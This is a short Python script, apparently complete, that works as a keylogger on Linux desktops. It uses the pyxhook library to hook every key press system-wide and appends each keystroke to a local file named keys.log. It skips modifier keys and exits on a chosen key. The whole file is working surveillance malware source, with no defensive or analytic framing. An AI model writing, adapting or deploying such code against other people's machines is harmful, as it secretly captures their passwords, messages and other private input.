import pyxhook

def OnKeyPress(event):
 
    with open('keys.log', 'a') as file:

        escape = ['Shift_L', 'Control_L', 'Shift_R', 'Control_R', 'Alt_L', 'Alt_R', '[65027]']

        if any(event.Key in esc for esc in escape):
            pass

        elif event.Key == "space":
            file.write(" ")

        elif event.Key == "Return":
            file.write("[ENTER]\n")

        else:
            file.write(event.Key)


    if event.Ascii == 38:
        exit(0)

hm = pyxhook.HookManager()
hm.KeyDown = OnKeyPress

hm.HookKeyboard()

hm.start()
